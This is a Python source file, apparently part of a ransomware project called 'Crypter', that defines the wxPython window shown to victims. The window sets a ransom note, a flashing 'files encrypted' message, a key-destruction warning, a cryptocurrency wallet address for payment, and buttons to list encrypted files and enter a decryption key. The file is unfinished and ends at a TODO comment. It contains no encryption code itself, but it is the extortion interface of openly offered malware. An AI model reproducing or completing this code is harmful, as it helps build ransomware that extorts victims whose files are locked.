"""Subclass of MainFrame, which is generated by wxFormBuilder."""
'''
@summary: Crypter: GUI Class
@author: MLS
@version: 1.70
'''

# Import libs
import wx
import os

# Import Classes
import GuiAbsBase
import Base

# Implementing MainFrame
class Gui( GuiAbsBase.MainFrame, Base.Base):
	'''
	@summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
	labels, text, buttons, images etc. Also inherits from main Base for schema
	'''
	
	def __init__( self, image_path, start_time, encrypted_file_list, decrypter ):
		'''
		@summary: Constructor
		@param image_path: The path to look at to find resources, such as images.
		@param start_time: EPOCH time that the encryption finished.
		@param encrypted_file_list: List of encrypted files
		@param decrypter: Handle back to Main. For calling decryption method
		'''
		# Handle Params
		self.image_path = image_path
		self.start_time = start_time
		self.encrypted_file_list = encrypted_file_list
		self.decrypter = decrypter
		
		# Super
		GuiAbsBase.MainFrame.__init__( self, parent=None )
		
		### Update GUI START
		
		# Set title
		self.CrypterTitleBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(image_path, self.GUI_IMAGE_TITLE),
				wx.BITMAP_TYPE_ANY))

		# Set flashing text initial label
		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
		
		# Set Ransom Message
		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)

		# Set Logo
		self.LockBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(image_path, self.GUI_IMAGE_LOGO),
				wx.BITMAP_TYPE_ANY))
		
		# Set key destruction label
		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION)

		# Set Wallet Address label
		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS)
		
		# Set Wallet Address Value
		self.WalletAddressString.SetLabel(self.WALLET_ADDRESS)

		# Set Button Text
		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES)
		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY)
		
		# TODO Continue from here with implementing functions from old Gui.py module
		
		### Update GUI END
		
		
		